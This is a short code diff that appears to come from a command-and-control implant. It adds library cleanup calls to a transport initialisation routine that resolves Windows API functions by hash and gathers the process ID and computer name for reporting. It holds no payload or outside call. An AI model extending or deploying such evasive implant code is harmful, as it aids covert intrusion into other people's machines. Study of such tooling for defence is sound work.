@@ -134,6 +134,10 @@ BOOL TransportInit( ) {
 
     GetCurrentProcessId_t p_GetCurrentProcessId = (GetCurrentProcessId_t) get_proc_address_by_hash(p_kernel32,GetCurrentProcessId_CRC32B);
     PackageAddInt32( Package, p_GetCurrentProcessId() );
+
+    FreeLibrary(p_advapi32);
+    FreeLibrary(p_iphlpapi);
+
 #else
     // Get Computer name
     if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
@@ -221,6 +225,7 @@ BOOL TransportInit( ) {
             Success = FALSE;
         }
     }
+
 
     return Success;
 }
